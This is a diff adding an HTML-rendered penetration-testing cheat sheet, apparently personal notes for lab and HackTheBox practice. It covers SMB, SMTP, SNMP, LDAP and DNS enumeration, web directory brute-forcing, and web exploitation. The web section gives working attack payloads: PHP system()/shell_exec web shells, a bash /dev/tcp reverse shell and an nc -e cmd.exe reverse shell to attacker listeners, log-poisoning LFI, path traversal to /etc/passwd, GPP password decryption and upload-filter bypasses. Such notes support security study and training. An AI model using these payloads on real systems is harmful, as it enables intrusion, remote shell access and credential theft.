+ls –l /usr/share/nmap/scripts/ &lt;span class="p"&gt;|&lt;/span&gt; grep smb
+
+nmap –p &lt;span class="m"&gt;139&lt;/span&gt;, &lt;span class="m"&gt;445&lt;/span&gt; –script&lt;span class="o"&gt;=&lt;/span&gt;smb-check-vulns –script-args&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;unsafe&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;$ip&lt;/span&gt;
+
+&lt;span class="c1"&gt;# useful for OS&lt;/span&gt;
+nmap -v -p &lt;span class="m"&gt;139&lt;/span&gt;, &lt;span class="m"&gt;445&lt;/span&gt; --script&lt;span class="o"&gt;=&lt;/span&gt;smb-os-discovery &lt;span class="m"&gt;10&lt;/span&gt;.11.1.0/24
+
+nmap -v -p &lt;span class="m"&gt;139&lt;/span&gt;,445 --script&lt;span class="o"&gt;=&lt;/span&gt;smb-vuln-ms08-067 --script-args&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;unsafe&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.11.1.0/24
+
+&lt;span class="c1"&gt;# Can use Wireshark to get version of == samba 2.2.7a by running&lt;/span&gt;
+smbclient –L &lt;span class="m"&gt;10&lt;/span&gt;.11.1.154
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;SMB: smbmap (better than enum4linux)&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smbmap –H &lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="c1"&gt;# gives sharenames for next step&lt;/span&gt;
+smbmap –R &amp;lt;sharename&amp;gt; -H &lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="c1"&gt;# yields Group.xl or similar&lt;/span&gt;
+smbmap –R &amp;lt;sharename&amp;gt; -H &lt;span class="nv"&gt;$ip&lt;/span&gt; –A Groups.xml –q &lt;span class="c1"&gt;# get Group.xml or similar&lt;/span&gt;
+updatedb&lt;span class="p"&gt;;&lt;/span&gt; locate Groups.xml
+smbmap –h &lt;span class="c1"&gt;# to view other naughty uses&lt;/span&gt;
+less Groups.xml
+gpp-decrypt “copy&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;paste &lt;span class="nb"&gt;hash&lt;/span&gt; from Groups.xml here”
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Simple Mail Transfer Protocol (SMTP) –p25&lt;/h3&gt;
+&lt;p&gt;The SMTP server, maintains a database of every email address in the organization 
+Uses many verbs EXPN, VRFY etc against SMTP to gather info. May help with brute forcing later or the Users found represent users on organizations email server and can employ Social engineering emails.&lt;/p&gt;
+&lt;h5&gt;SMTP: Get users&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;telnet &lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="m"&gt;25&lt;/span&gt; OR nc -nv &lt;span class="m"&gt;10&lt;/span&gt;.11.1.215 &lt;span class="m"&gt;25&lt;/span&gt; 
+VRFY sys &lt;span class="c1"&gt;# 250 2.1.5 &amp;lt;sys@redhat.acme.com&amp;gt; &lt;/span&gt;
+VRFY root &lt;span class="c1"&gt;# 550 5.1.1 root… User unknown&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;SMTP: bash one liner to test usernames&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; user in &lt;span class="k"&gt;$(&lt;/span&gt;cat users.txt&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; VRFY &lt;span class="nv"&gt;$user&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;nc –nv –w l &lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null &lt;span class="p"&gt;|&lt;/span&gt;grep ^&lt;span class="s2"&gt;&amp;quot;250&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;SMTP: Python script to test usernames&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python vrfy.py usernames.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;SMTP: smtp-user-enum tool&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smtp-user-enum -M VRFY -U /usr/share/fern-wifi-cracker/extras/wordlists/common.txt -t &lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="c1"&gt;# automate the verification process &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;SMTP: nmap&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap –v –p &lt;span class="m"&gt;25&lt;/span&gt; –script&lt;span class="o"&gt;=&lt;/span&gt;smtp-enum-users &lt;span class="m"&gt;10&lt;/span&gt;.11.15.54
+nmap –p &lt;span class="m"&gt;25&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.11.1.0/24 –oG pre_smtp_ips.txt &lt;span class="c1"&gt;# scan full ip range&lt;/span&gt;
+grep &lt;span class="s2"&gt;&amp;quot;Up&amp;quot;&lt;/span&gt; pre_smtp_ips.txt &lt;span class="p"&gt;|&lt;/span&gt; cut –d “ “ –f &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sort –u &amp;gt;&amp;gt; smtp_ips.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Simple Network Management Protocol (SNMP) –p161 – Uses UDP&lt;/h3&gt;
+&lt;p&gt;UDP susceptible to sniff/IP spoof, MIB. Unencrypt creds, weak auth, often default config&lt;/p&gt;
+&lt;p&gt;Managed Device: is a device or a host (node) which has the  SNMP service enabled. These devices could be routers, switches, hubs, bridges, computers etc.&lt;/p&gt;
+&lt;p&gt;Agent: software on managed device&lt;/p&gt;
+&lt;p&gt;Network Management System: Software systems used in monitoring network devices&lt;/p&gt;
+&lt;p&gt;Management Information Base virtual db containing a formal description of all network objects identified by a specific object identifier (OID) that can be managed using SNMP.&lt;/p&gt;
+&lt;p&gt;Community strings: clear text strings used to authenticate communications between the management stations and network devices on which SNMP agents are hosted. Community Strings are sent with every packet exchanged between node and management station.&lt;/p&gt;
+&lt;h4&gt;SNMP: Find snmp servers with nmap&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap –sU –open –p &lt;span class="m"&gt;161&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.11.1.1-254 –oG mega-snmp.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;SNMP: Find snmp servers with onesixtyone and try community strings&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;onesixtone –c community_strings.txt –i full_ip_range &amp;gt; snmp.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;SNMP: snmpwalk effective if we know the read-only community string (most often called ‘public’)&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Enum entire MIB tree: &lt;/span&gt;
+snmpwalk -c public -v1 &lt;span class="m"&gt;10&lt;/span&gt;.11.1.219 &lt;span class="c1"&gt;# produces to much info&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Enum entire MIB tree: &lt;/span&gt;
+snmpwalk -c public -v1 &lt;span class="m"&gt;10&lt;/span&gt;.11.1.219 expose comm str &lt;span class="s2"&gt;&amp;quot;public&amp;quot;&lt;/span&gt;.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;SNMP: As snmp walk produces so much info we can trim it by providing the correct MIB value&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Enum Windows Users: &lt;/span&gt;
+snmpwalk -c public -v1 &lt;span class="m"&gt;10&lt;/span&gt;.11.1.204 &lt;span class="m"&gt;1&lt;/span&gt;.3.6.1.4.1.77.1.2.25
+
+&lt;span class="c1"&gt;# Enum RunWindows Process: &lt;/span&gt;
+snmpwalk -c public -v1 &lt;span class="m"&gt;10&lt;/span&gt;.11.1.204 &lt;span class="m"&gt;1&lt;/span&gt;.3.6.1.2.1.25.4.2.1.2
+
+&lt;span class="c1"&gt;# Enum Open TCP Ports: &lt;/span&gt;
+snmpwalk -c public -v1 &lt;span class="m"&gt;10&lt;/span&gt;.11.1.204 &lt;span class="m"&gt;1&lt;/span&gt;.3.6.1.2.1.6.13.1.3
+
+&lt;span class="c1"&gt;# Enum Installed Software: &lt;/span&gt;
+snmpwalk -c public -v1 &lt;span class="m"&gt;10&lt;/span&gt;.11.1.204 &lt;span class="m"&gt;1&lt;/span&gt;.3.6.1.2.1.25.6.3.1.2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;There are a few other MIB values (not mentioned here) to try.&lt;/p&gt;
+&lt;h3&gt;LDAP (p389)&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ldapsearch -x -h &lt;span class="m"&gt;10&lt;/span&gt;.10.10.107
+
+locate -r nse$&lt;span class="p"&gt;|&lt;/span&gt;grep ldap
+/usr/share/nmap/scripts/ldap-brute.nse
+/usr/share/nmap/scripts/ldap-novell-getpass.nse
+/usr/share/nmap/scripts/ldap-rootdse.nse
+/usr/share/nmap/scripts/ldap-search.nse
+
+nmap -p &lt;span class="m"&gt;389&lt;/span&gt; --script ldap-search.nse -Pn &lt;span class="m"&gt;10&lt;/span&gt;.10.10.107
+
+ldapsearch -x -h10.10.10.107 -s sub -b&lt;span class="s1"&gt;&amp;#39;dc=hackthebox, dc=htb&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;DNS: Getting hold of subdomains&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;host –t ns&lt;span class="o"&gt;(&lt;/span&gt;mx&lt;span class="o"&gt;)&lt;/span&gt; megacorpone.com&lt;span class="p"&gt;;&lt;/span&gt; get_all_subdomains_html.sh
+./forward_dns_enum.sh &lt;span class="o"&gt;(&lt;/span&gt;get unique_ips&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; ./reverse_dns_enum.sh &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;/24 on unique_ips&lt;span class="o"&gt;)&lt;/span&gt;
+./dns_zone_transfer.sh megacorpone.com
+dnsrecon –d megacorpone.com –t axfr&lt;span class="p"&gt;;&lt;/span&gt; dnsenum megacorpone.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;nslookup&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nslookup
+&amp;gt; server &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13
+Default server: &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13
+Address: &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13#53
+&amp;gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13
+&lt;span class="m"&gt;13&lt;/span&gt;.10.10.10.in-addr.arpa &lt;span class="nv"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ns1.cronos.htb.
+&amp;gt; cronos.htb
+Server: &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13
+Address: &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13#53
+Name: cronos.htb
+Address: &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;DNS zone transfer&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dig axfr @10.10.10.13 cronos.htb
+&lt;span class="p"&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG &lt;span class="m"&gt;9&lt;/span&gt;.11.4-2-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @10.10.10.13 cronos.htb
+&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; server found&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt; global options: +cmd
+cronos.htb. &lt;span class="m"&gt;604800&lt;/span&gt; IN SOA cronos.htb. admin.cronos.htb. &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;604800&lt;/span&gt; &lt;span class="m"&gt;86400&lt;/span&gt; &lt;span class="m"&gt;2419200&lt;/span&gt; &lt;span class="m"&gt;604800&lt;/span&gt;
+cronos.htb. &lt;span class="m"&gt;604800&lt;/span&gt; IN NS ns1.cronos.htb.
+cronos.htb. &lt;span class="m"&gt;604800&lt;/span&gt; IN A &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13
+admin.cronos.htb. &lt;span class="m"&gt;604800&lt;/span&gt; IN A &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13
+ns1.cronos.htb. &lt;span class="m"&gt;604800&lt;/span&gt; IN A &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13
+www.cronos.htb. &lt;span class="m"&gt;604800&lt;/span&gt; IN A &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13
+cronos.htb. &lt;span class="m"&gt;604800&lt;/span&gt; IN SOA cronos.htb. admin.cronos.htb. &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;604800&lt;/span&gt; &lt;span class="m"&gt;86400&lt;/span&gt; &lt;span class="m"&gt;2419200&lt;/span&gt; &lt;span class="m"&gt;604800&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;55&lt;/span&gt; msec
+&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;10&lt;/span&gt;.10.10.13#53&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.13&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt; WHEN: Mon Jun &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:00:39 EDT &lt;span class="m"&gt;2019&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt; XFR size: &lt;span class="m"&gt;7&lt;/span&gt; records &lt;span class="o"&gt;(&lt;/span&gt;messages &lt;span class="m"&gt;1&lt;/span&gt;, bytes &lt;span class="m"&gt;203&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+NOW GO BACK INTO HOSTS
+&lt;span class="m"&gt;10&lt;/span&gt;.10.10.13 www.cronos.htb ns1.cronos.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;DNS zone transfer &amp;amp; resolv.conf&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dig axfr bank.htb @10.10.10.29
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Can either add those names to host file or, as we have DNS we can add them to &lt;code&gt;resolv.conf&lt;/code&gt; and specify bank as DNS server&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ping bank.htb
+ping: bank.htb: Name or service not known
+nano /etc/resolv.conf
+nameserver &lt;span class="m"&gt;10&lt;/span&gt;.10.10.29
+ping bank.htb
+PING bank.htb &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.29&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;56&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;84&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; bytes of data.
+&lt;span class="m"&gt;64&lt;/span&gt; bytes from &lt;span class="m"&gt;10&lt;/span&gt;.10.10.29 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.29&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;63&lt;/span&gt; &lt;span class="nv"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;54&lt;/span&gt;.8 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Websites&lt;/h3&gt;
+&lt;h4&gt;Websites: gobuster&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Standard gobuster&lt;/span&gt;
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.11.1.10
+
+&lt;span class="c1"&gt;# HTTPS&lt;/span&gt;
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x txt
+
+&lt;span class="c1"&gt;# CGIS gobuster&lt;/span&gt;
+gobuster -w /usr/share/wfuzz/wordlist/vulns/cgis.txt -u http://10.11.1.10 -s &lt;span class="m"&gt;200&lt;/span&gt;,204,403,500, -e
+
+&lt;span class="c1"&gt;# Include 403s&lt;/span&gt;
+gobuster -u http://10.10.10.56 -w /usr/share/wordlists/dirb/small.txt -s &lt;span class="m"&gt;302&lt;/span&gt;,307,200,204,301,403
+
+&lt;span class="c1"&gt;# On specific dir (cgi-bin) with common extensions&lt;/span&gt;
+gobuster -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s &lt;span class="m"&gt;302&lt;/span&gt;,307,200,204,301,403 -x sh,pl
+
+&lt;span class="c1"&gt;# With login credentials&lt;/span&gt;
+gobuster -P admin -U admin -u http://192.168.39.83:8080/tiki. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+&lt;span class="c1"&gt;# -f append forward slash, -l include length of body&lt;/span&gt;
+gobuster -u http://apocalyst.htb -w /usr/share/dirb/wordlists/small.txt -f -l
+
+&lt;span class="c1"&gt;# Use words gathered from webpage to input into gobuster&lt;/span&gt;
+cewl apocalyst.htb -w cewl.txt → gobuster
+gobuster -u http://apocalyst.htb -w cewl.txt -f -l &lt;span class="p"&gt;|&lt;/span&gt; tee gobuster.txt
+cat gobuster.txt &lt;span class="p"&gt;|&lt;/span&gt; grep -v ‘Size: &lt;span class="m"&gt;157&lt;/span&gt;’
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Websites: dirbuster&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Standard&lt;/span&gt;
+dirb http://10.10.10.10 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+&lt;span class="c1"&gt;# None-recursice dirb&lt;/span&gt;
+dirb http://10.11.1.10 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
+dirb &lt;span class="nv"&gt;$ip&lt;/span&gt; directory-list-2.3-medium.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Websites: nikto&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nikto -host https://10.11.1.10 -o nikto_results -F txt -ssl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;nikto can bypass as a search engine and sometimes get the robots.txt if hidden
+If NIKTO shows that the HOST allows HTTP “PUT”:
+Use &lt;code&gt;davtest&lt;/code&gt; then &lt;code&gt;cadaver&lt;/code&gt;&lt;/p&gt;
+&lt;h4&gt;Websites: wordpress&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;wpcan --url http://10.10.10.10 --force
+wpscan --url &lt;span class="nv"&gt;$ip&lt;/span&gt;/blog --enumerate --u --log
+ruby wpscan.rb --u &lt;span class="m"&gt;10&lt;/span&gt;.10.10.10 --threads &lt;span class="m"&gt;20&lt;/span&gt; --wordlist rockyou.txt --username admin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Websites: davtest/cadaver&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;davtest --url http://10.10.10.10
+cadaver &lt;span class="m"&gt;10&lt;/span&gt;.10.10.10
+put shell.txt
+mv shell.txt shell.asp
+mv shell.txt shell.asp&lt;span class="p"&gt;;&lt;/span&gt;.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Websites: PHP code&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt; &lt;span class="nx"&gt;php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ipp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;span class="x"&gt;User-Agent: &lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ipp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.11.0.174/9001 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If target is a linux server we can put &lt;code&gt;GIF8&lt;/code&gt; at top of php code or add a large amount of png code prior to php to fool the server.&lt;/p&gt;
+&lt;p&gt;Null byte
+&lt;code&gt;shell.php%001.jpg&lt;/code&gt; → Recognized as a &lt;code&gt;.jpg&lt;/code&gt; at upload but the &lt;code&gt;%00&lt;/code&gt; terminates file and is treated as a legit php when stored on server.&lt;/p&gt;
+&lt;h4&gt;Websites LFI (eg LANG files en.php, can we include/read a different file from url manipulation)&lt;/h4&gt;
+&lt;h5&gt;URL: Access files&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;LANG=../../../../../../../windows/system32/drivers/etc/hosts&lt;/code&gt;&lt;/p&gt;
+&lt;h5&gt;URL: Fails with a warning .php file doesn’t exist. Add null-byte to void the php suffix&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;LANG=../../../../../../../windows/system32/drivers/etc/hosts%00&lt;/code&gt;&lt;/p&gt;
+&lt;h6&gt;Contaminate files (logs) with php&lt;/h6&gt;
+&lt;p&gt;Include directive will execute PHP code within the included files (Apache access logs)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -nv &lt;span class="m"&gt;10&lt;/span&gt;.11.15.54 &lt;span class="m"&gt;80&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Input to the nc connection &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt; 10mins=&amp;gt;err 400&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Our php is in file system. Append &lt;code&gt;cmd&lt;/code&gt; variable and command to URL string.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -nlvp &lt;span class="m"&gt;4444&lt;/span&gt; &lt;span class="c1"&gt;# set up the listener&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code&gt;http://10.11.15.54... &amp;amp;comment=b&amp;amp;cmd=nc -nv 10.11.0.160 4444 -e cmd.exe&amp;amp;LANG=../../../../../../../xampp/apache/logs/access.log%00&lt;/code&gt;&lt;/p&gt;
+&lt;h5&gt;For LFI look for the include() function in PHP code.&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;include(&amp;quot;lang/&amp;quot;.$_COOKIE[&amp;#39;lang&amp;#39;]); &lt;/span&gt;
+&lt;span class="x"&gt;include($_GET[&amp;#39;page&amp;#39;].&amp;quot;.php&amp;quot;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;LFI - Encode and Decode a file using base64&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -s &lt;span class="se"&gt;\ &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://&lt;/span&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt;&lt;span class="s2"&gt;/?page=php://filter/convert.base64-encode/resource=index&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\ &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; grep -e &lt;span class="s1"&gt;&amp;#39;\[^\\ \]\\{40,\\}&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64 -d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;LFI - Download file with base 64 encoding&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php&lt;/code&gt;&lt;/p&gt;
+&lt;h5&gt;LFI - Download passwords file&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;http://$ip/index.php?page=/etc/passwd&lt;/code&gt;
+&lt;code&gt;http://$ip/index.php?file=../../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;h5&gt;LFI - Download passwords file with filter evasion&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd&lt;/code&gt;&lt;/p&gt;
+&lt;h5&gt;LFI - In versions of PHP below 5.3 we can terminate with null byte&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;GET /addguestbook.php?name=Haxor&amp;amp;comment=Merci!&amp;amp;LANG=../../../../../../../windows/system32/drivers/etc/hosts%00&lt;/code&gt;&lt;/p&gt;
